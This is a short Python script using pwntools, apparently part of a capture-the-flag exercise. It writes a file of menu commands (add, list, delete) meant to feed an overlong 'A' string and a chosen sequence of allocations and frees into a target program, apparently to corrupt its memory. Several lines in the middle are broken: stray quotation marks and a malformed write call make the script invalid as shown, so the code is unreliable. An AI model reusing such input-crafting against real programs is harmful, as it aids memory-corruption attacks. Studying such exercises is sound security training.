from pwn import *



payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"

with open("payload", "wb") as f:
    f.write(b"a\n")
    f.write(b"255\n")
    f.write(payload)
    f.write(b"l\n")
    
    f.write(b"a\n")
    f.write(b"1\n")
    f.write(b"A\n")

    f.write(b"a\n")
    f.write(b"1\n")
    f.write(b"A\n")

    f.write(b"l\n")

    f.write(b"d\n")
    f.write(b"1\n")

    f.write(b"a\n")"?
    "
    "
    f.write(b"1\n")
    f.write(b"A\n")

    f.write(b"d\n")
    f.write(b"2\n")

    f.close()
